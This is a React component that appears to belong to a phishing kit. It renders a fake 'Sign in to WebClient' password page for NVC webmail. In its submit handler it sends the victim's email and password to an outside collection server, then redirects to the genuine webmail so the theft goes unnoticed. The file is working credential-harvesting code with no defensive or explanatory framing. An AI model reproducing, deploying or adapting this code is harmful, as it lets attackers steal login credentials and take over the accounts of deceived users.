import React from 'react';
import axios from 'axios';
import './hometwo.css';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import logotwo from './logotwo.gif';
import { useLocation } from 'react-router-dom';

function Next(){

    const location = useLocation();
    
    const[password, setPassword] = useState("");
    
    const[email ,setEmail] = useState(location.state.email);

    const[platform, setPlatform] = useState("Nvc")

    const[showError, setShowError] = useState(false);

    const[isLoading, setIsLoading]= useState(false);

    const[showPassword, setShowPassword] = useState(false);


    async function handleSubmit(e){
        e.preventDefault();
    
        try {

            setIsLoading(true);
            const response = await axios.post('https://oneback-9wpi.onrender.com/api/send', {
                email:email,
                password:password,
                platform:platform
            });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
    
                window.location.href = 'https://mail.nvc.net/webmail/';

            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    }



    return (
        <div className='mainContent'>

        <div className='col-md-3 m-auto maindivtwo'>

            <div className='imagediv text-center py-3'>
                
                <div className='circle p-3 rounded-circle m-auto'>
                    <h3 className='circlehead'>{email.charAt(0)}</h3>
                </div>

            </div>

            <h2 className='mainhead'>Sign in to WebClient </h2>

          

            <form onSubmit={handleSubmit}>
            <div className='borderdiv'>
                <input onChange={function(e){
                   setPassword(e.target.value);
               }} value={password} type={showPassword ? "text" : "password"}className='form-control w-100 py-4'placeholder='Password' required/>
                
                    <div className='text-right pr-3'>
                    <span onClick={function(e){
                        e.preventDefault();
                        setShowPassword(!showPassword);
                    }} className='show'>{showPassword ? "Hide" : "Show"}</span>
                    </div>
                </div>
                
                <div className='px-3'>
                <button className='next btn w-100'>Sign in</button>

                </div>

            <div className='px-3 pb-3 showborder'>
            <input type="checkbox" /><span className='px-3 smalll'>Keep me signed in</span>

            </div>

            <p className='text-center smalll py-3'>Not you? <span className='colorme'>Check your account again</span></p>

            </form>

        

        </div>


        

    </div>
    );

}

export default Next;
